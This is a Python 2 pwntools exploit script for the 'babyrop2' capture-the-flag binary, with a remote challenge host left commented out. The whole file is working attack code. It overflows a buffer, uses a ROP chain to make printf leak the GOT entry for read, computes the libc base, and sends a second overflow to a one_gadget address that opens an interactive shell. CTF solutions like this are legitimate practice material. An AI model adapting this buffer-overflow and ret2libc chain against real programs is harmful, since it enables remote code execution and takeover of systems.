from pwn import *


binpath = './babyrop2'
context.binary = binpath
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF(binpath)
# libc = elf.libc
libc = ELF('./libc.so.6')


gdbscript = '''
peda
# b main
# just before rop
b *0x4006cb
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
# io = remote('problem.harekaze.com', 20005)


addr_pop_rdi = 0x0000000000400733
addr_pop_rsi_r15 = 0x0000000000400731
addr_s = 0x400790
# addr_main = 0x400636

payload = 'A' * 0x28

rop = ''
# printf("%s!\n", elf.got['printf'])
rop += p64(addr_pop_rdi)
rop += p64(addr_s)
rop += p64(addr_pop_rsi_r15)
rop += p64(elf.got['read'])
rop += p64(0xdeadbeafdeadbeaf)
rop += p64(elf.plt['printf'])
# main()
rop += p64(elf.symbols['main'])

io.recvuntil('? ')
io.sendline(payload + rop)

io.recvline()

data = io.recvuntil('!').rstrip('\n!')
addr_printf = u64(data.ljust(8, '\x00'))
addr_libc = addr_printf - libc.symbols['read']
addr_gets = addr_libc + libc.symbols['gets']

one_gadgets = [283158, 283242, 983716, 987463]
addr_one_gadget = addr_libc + one_gadgets[0]

print "addr_libc = {}".format(hex(addr_libc))

payload = 'B' * 0x28 + p64(addr_one_gadget)
io.recvuntil('? ')
io.sendline(payload)


io.interactive()
